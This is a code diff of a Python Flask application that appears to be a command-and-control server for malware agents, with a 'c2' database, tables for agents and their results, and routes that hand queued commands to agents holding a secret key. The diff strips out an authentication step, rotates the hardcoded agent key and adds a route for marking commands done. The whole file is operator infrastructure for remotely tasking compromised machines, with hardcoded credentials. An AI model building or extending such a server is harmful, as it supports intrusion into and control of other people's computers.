@@ -20,8 +20,6 @@ username = "pogChamp"
 password = "BestC2Ever"
 server = "localhost"
 
-authToken = "areTheyDeadYet"
-
 app.config["SQLALCHEMY_DATABASE_URI"] = "mysql+mysqlconnector://{}:{}@{}/c2".format(
     username, password, server)
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
@@ -30,7 +28,7 @@ app.config['TEMPLATES_AUTO_RELOAD'] = True
 
 db = SQLAlchemy(app)
 
-password = 'Bobobo'
+password = 'b4bysh4rk'
 
 
 def main():
@@ -53,12 +51,6 @@ class Results(db.Model):
     logging.debug('Table: results, columns: {}, {}'.format(id, results))
 
 
-class Users(db.Model):
-
-    username = db.Column(db.String(64), primary_key=True)
-    logging.debug('Table: username: {}'.format(username))
-
-
 class Agents(db.Model):
 
     guid = db.Column(db.String(64), primary_key=True)
@@ -68,8 +60,8 @@ class Agents(db.Model):
         guid, user, computer))
 
 
-@app.route('/home')
-def controlCenter():
+@app.route('/')
+def home():
     if len(Results.query.all()) == 0:
         return render_template('index.html', returns=' \n ')
     else:
@@ -94,12 +86,9 @@ def register():
     db.session.commit()
     return render_template('register.html')
 
-# TODO CHANGE THIS FUNCTION TO WORK WITH STEGANOGRAPHY
-# NOTE WE WILL PROBABLY HAVE TO CHANGE THE SQL DATABASE WITH THIS, TOO
-
 
 @app.route('/commands')
-def getCommand():
+def getcommand():
     secretkey = request.args.get('key')
     guid = request.args.get('guid')
     if secretkey == password:
@@ -131,37 +120,22 @@ def create():
         return render_template('redir.html')
 
 
+@app.route('/done/<id>')
+def done(id):  # marks the command "done" in the sql database
+    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
+        task = Command.query.filter_by(id=int(id)).first()
+        task.done = not task.done
+        db.session.commit()
+        return redirect(url_for('home'))
+    else:
+        return render_template('redir.html')
+
+
 @app.route('/delete/<id>')
 def delete(id):
     Command.query.filter_by(id=int(id)).delete()
     db.session.commit()
     return redirect(url_for('home'))
-
-
-@app.route('/')
-def home():
-    auth = request.args.get('auth')
-    # ensure that the user accessing the page should be here
-    if auth != authToken:
-        return render_template('redir.html')
-    else:
-        return render_template('login.html', auth)
-
-
-@app.route('/login')
-def login():
-    # ensure that the user accessing the page should be here
-    # if auth != authToken:
-    #     return render_template('redir.html')
-
-    username = request.args.get('username')
-    uPassword = request.args.get('password')
-    if uPassword == password:
-        # protected is a function defined in this file
-        return redirect(url_for('/home', username, uPassword))
-
-    # information did not match
-    return render_template('redir.html')
 
 
 if __name__ == '__main__':
